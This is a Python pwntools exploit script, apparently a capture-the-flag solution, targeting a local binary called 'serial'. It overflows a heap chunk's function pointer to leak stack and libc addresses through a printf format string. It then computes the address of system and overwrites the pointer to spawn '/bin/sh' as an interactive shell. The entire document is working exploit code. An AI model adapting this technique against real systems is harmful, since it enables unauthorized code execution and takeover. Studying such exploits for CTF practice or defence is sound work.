from pwn import *

# key from angr script 'find_key.py'
key = "615066814080"

p = process("./serial")

gdb.attach(p, "c")
p.sendline(key)

# leak libc by creating a chunk and overflowing the func ptr to call printf with a cust fmt str

fmt_str = "%8llx." * 4
p.recvuntil("Smash me!")
p.sendline("1")


p.sendline(fmt_str + p64(0x400790))

# do dump

if p.can_recv():
    p.recv()
p.sendline("3")

leaks = p.recv().split("\n")
leaks = leaks[-3].split("Smash me!")[0].split(".")

stack_leak = int(leaks[0],16)
libc_leak = int(leaks[2], 16)

stack_base = stack_leak - 118272
libc_base = libc_leak - 1012368

print "stack base:", hex(stack_base)
print "libc base:", hex(libc_base)

system_addr = libc_base + 283536

# now, instead of fmt string, send /bin/sh and overwrite the func ptr to point to system

# remove
p.sendline("2")
p.sendline("0")

p.recv()
p.sendline("1")
p.sendline("/bin/sh;" + "B"*16 + p64(system_addr))

# call system
p.sendline("3")

# shell!
p.interactive()

